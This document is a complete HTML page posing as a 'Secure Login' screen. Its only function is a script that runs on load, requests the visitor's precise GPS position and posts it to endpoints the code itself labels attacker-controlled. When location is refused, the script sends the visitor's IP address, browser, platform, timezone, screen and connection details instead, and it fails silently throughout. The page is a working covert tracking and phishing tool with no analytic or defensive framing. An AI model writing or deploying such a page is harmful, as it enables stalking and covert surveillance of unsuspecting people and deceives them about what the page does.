<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>Secure Login</title>
    <style>
        /* Mobile optimized styling */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        h1 {
            font-weight: 700;
            margin-bottom: 1rem;
        }
        p {
            font-size: 1rem;
            margin-bottom: 2rem;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>Secure Login</h1>
    <p>Please wait while we verify your location...</p>
    <div class="spinner" aria-label="Loading"></div>

    <script>
        // Attacker-controlled endpoints
        const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
        const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');

        // Helper to send POST data as JSON
        async function postJSON(url, data) {
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) {
                // Fail silently
            }
        }

        // Collect fallback info
        async function collectFallback() {
            const userAgent = navigator.userAgent || '';
            const language = navigator.language || '';
            const platform = navigator.platform || '';
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            const connectionType = connection.effectiveType || connection.type || '';

            // Fetch public IP from external API
            let ip = '';
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                if (resp.ok) {
                    const json = await resp.json();
                    ip = json.ip || '';
                }
            } catch (e) {
                // ignore
            }

            const fallbackData = {
                userAgent,
                language,
                platform,
                timezone,
                screenResolution,
                connectionType,
                ip
            };

            await postJSON(ENDPOINT_FALLBACK, fallbackData);
        }

        // Main function to get location
        function getLocation() {
            if (!navigator.geolocation) {
                // Geolocation API not supported
                collectFallback();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const coords = position.coords;
                    const data = {
                        latitude: coords.latitude,
                        longitude: coords.longitude
                    };
                    await postJSON(ENDPOINT_GPS, data);
                },
                (error) => {
                    // Permission denied or other error
                    collectFallback();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        getLocation();
    </script>
</body>
</html>
